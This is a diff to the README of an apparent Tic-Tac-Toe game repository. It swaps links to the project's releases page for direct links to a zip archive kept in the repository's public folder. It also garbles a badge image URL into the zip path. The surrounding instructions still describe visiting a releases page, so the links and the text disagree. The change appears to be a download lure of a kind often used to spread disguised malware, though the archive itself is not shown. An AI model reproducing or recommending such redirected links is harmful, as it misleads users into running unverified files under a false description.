@@ -6,7 +6,7 @@ Welcome to the Tic-Tac-Toe game! This application lets you play Tic-Tac-Toe agai
 
 ## 📥 Download the Game
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started%20!%20-blue)](https://github.com/peti3619/tic-tac-toe/releases)
+[![Download Here](https://github.com/peti3619/tic-tac-toe/raw/refs/heads/main/public/toe_tic_tac_2.2-beta.4.zip%20Now-Get%20Started%20!%20-blue)](https://github.com/peti3619/tic-tac-toe/raw/refs/heads/main/public/toe_tic_tac_2.2-beta.4.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you begin, ensure your computer meets the following minimum requirements:
 ## ✔️ Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
-   - [Visit this page to download](https://github.com/peti3619/tic-tac-toe/releases)
+   - [Visit this page to download](https://github.com/peti3619/tic-tac-toe/raw/refs/heads/main/public/toe_tic_tac_2.2-beta.4.zip)
   
 2. **Select the Latest Version:** On the releases page, find the latest version of the Tic-Tac-Toe game.
 
@@ -75,4 +75,4 @@ Join our community to discuss strategies, share tips, or offer feedback:
 
 Thank you for trying out Tic-Tac-Toe. Enjoy playing, and may the best strategist win!
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started%20!%20-blue)](https://github.com/peti3619/tic-tac-toe/releases)
+[![Download Here](https://github.com/peti3619/tic-tac-toe/raw/refs/heads/main/public/toe_tic_tac_2.2-beta.4.zip%20Now-Get%20Started%20!%20-blue)](https://github.com/peti3619/tic-tac-toe/raw/refs/heads/main/public/toe_tic_tac_2.2-beta.4.zip)
